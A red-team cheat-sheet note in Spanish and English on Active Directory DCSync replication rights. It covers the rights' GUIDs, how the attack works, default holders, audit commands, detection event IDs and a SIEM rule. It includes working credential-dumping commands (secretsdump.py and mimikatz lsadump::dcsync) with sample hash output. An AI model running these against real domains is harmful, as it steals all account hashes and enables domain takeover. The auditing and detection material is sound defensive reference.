---
aliases:
  - DCSync Definition
  - GetChanges
  - GetChangesAll
  - DRSUAPI Replication
tags:
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
  - "[[Information Gathering]]"
tertiary categories:
  - "[[Active Directory Enumeración]]"
kind: SubCheatSheet
linked:
  - "[[AD - DCSync Rights Discovery]]"
---
# AD - DCSync Rights Discovery - DCSync Rights Definition

---

## Replication Extended Rights

| **GUID** | **Right** | **Función** |
|:---:|:---:|:---:|
| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Get-Changes` | Replicate metadata + filtered attrs. |
| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Get-Changes-All` | Replicate **all attrs** (incluye creds). |
| `89e95b76-444d-4c62-991a-0facbeda640c` | `DS-Replication-Get-Changes-In-Filtered-Set` | RODC scope — filtered. |
| `1131f6ac-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Synchronize` | Trigger replicación entre DCs. |
| `1131f6ae-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Manage-Topology` | KCC manipulation (edge). |
^ad-dcsync-rights

**Combo crítico:** `GetChanges` + `GetChangesAll` sobre domain root = full DCSync. **Solo `GetChanges` no es suficiente** (no devuelve credenciales).

```bash
# DCSync requirement check via BloodHound
# MATCH (u)-[r:GetChanges]->(d:Domain)
# MATCH (u)-[r2:GetChangesAll]->(d)
# RETURN u.name
```

---

## DCSync Mechanism

| **Step** | **Comando** | **Detalle** |
|:---:|:---:|:---:|
| 1. Auth as principal con DCSync rights | `kinit user` o `runas` | Standard auth. |
| 2. Connect a DC via DRSUAPI RPC | `secretsdump.py -just-dc` o mimikatz | Tool maneja. |
| 3. Send `IDL_DRSGetNCChanges` request | RPC call | Tool internal. |
| 4. DC valida ACE en domain root | `nTSecurityDescriptor` check | Auto. |
| 5. DC retorna replication blob | Binary response | Tool. |
| 6. Tool parses → NT hash + Kerberos keys + history | Output text | Tool. |
^ad-dcsync-mechanism

```bash
# Standard DCSync (Linux)
secretsdump.py corp.local/atacante:'pass'@<DC> -just-dc

# Output:
# Administrator:500:aad3b435...:abc123...:::
# krbtgt:502:aad3b435...:def456...:::
# corp.local\jsmith:1234:aad3b435...:789xyz...:::
# ...

# Targeted single user
secretsdump.py 'corp.local/atacante:pass'@<DC> -just-dc-user Administrator
```

```cmd
:: Mimikatz Windows
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /all /csv
```

---

## Default DCSync Holders

| **Principal** | **Por qué** | **Cuándo** |
|:---:|:---:|:---:|
| Domain Admins | Tier 0 default | Standard. |
| Enterprise Admins (forest root) | Forest Tier 0 | Standard. |
| Administrators (Built-in) | Local DC admins | Standard. |
| Domain Controllers | Replication legítima | Standard. |
| Read-only Domain Controllers | RODC scope (filtered) | Standard. |
| Schema Admins (forest root) | Schema replication | Edge — typically empty. |
^ad-dcsync-defaults

**Audit principle:** cualquier principal **fuera de esa lista** con DCSync rights = audit finding crítico. Common attack persistence.

---

## Storage Location

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:DC=corp,DC=local"` | DACL del domain root (donde viven DCSync ACEs) | Audit standard. |
| `(Get-Acl "AD:DC=corp,DC=local").Access \| ? ObjectType -in (DCSync GUIDs)` | Solo ACEs DCSync | Targeted. |
| `Get-ADRootDSE \| Select defaultNamingContext` | Domain root DN | Bootstrap. |
^ad-dcsync-location

**DACL location:** ACEs viven en `nTSecurityDescriptor` del domain root object (`DC=corp,DC=local`). No en otros lados (no en Configuration NC, no en Schema NC para domain DCSync).

---

## Detection Considerations

| **Event ID** | **Significa** | **Cuándo logueado** |
|:---:|:---:|:---:|
| `4662` (Object Access — Directory Service Access) | Per-attribute access logged | Si SACL configurado. |
| `4929` (Directory Service Access — replication) | Replication request | Standard. |
| `4928` | Replication source recibido | Standard. |
| MDI alerta `Suspected DCSync attack` | Bulk replication anomaly | Modern detection. |
| Kerberos auth from non-DC source IP | Anomalous DCSync source | Defender side. |
^ad-dcsync-detection

```powershell
# Defender side — verify SACL en domain root
$sd = (Get-ADObject "DC=corp,DC=local" -Properties nTSecurityDescriptor).nTSecurityDescriptor
$sd.Audit | Where { $_.ObjectType -in (DCSync GUIDs) }
```

---

## RODC Filtered Set

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADDomainController -Filter {IsReadOnly -eq $true}` | RODC list | Adjacent. |
| `Get-ADObject "<RODC-NTDS-DN>" -Properties msDS-RevealedDSAs,msDS-NeverRevealGroup` | Cuentas con cred replicación al RODC | Per-RODC scope. |
| `Get-ADGroup "Allowed RODC Password Replication Group"` | Allowed list | Standard. |
| `Get-ADGroup "Denied RODC Password Replication Group"` | Denied list (Tier 0 default) | Standard. |
^ad-dcsync-rodc

**RODC scope:** RODCs solo replican passwords de `Allowed RODC Password Replication Group` members. `Denied` group (Tier 0 — DA, EA, etc) **nunca** replicado a RODC. RODC compromise = solo creds de Tier 1/2 expuestos.

---

## DCSync vs DC Replication

| **Aspecto** | **DCSync** | **DC Replication legítima** |
|:---:|:---:|:---:|
| Source | Tool atacante (mimikatz/secretsdump) | DC ↔ DC. |
| Source IP | Workstation atacante | Otro DC. |
| Frequency | One-shot | Periódica (cada ~15min default). |
| Auth | User credential | Computer (DC) account. |
| MDI baseline | Fuera de baseline | Dentro de baseline. |
| Detection | Anomaly | Normal. |
^ad-dcsync-vs-replication

**Defender SIEM rule:** alert on `4662` con DCSync GUIDs **donde source IP no es un DC**. Reduce false positives.

---
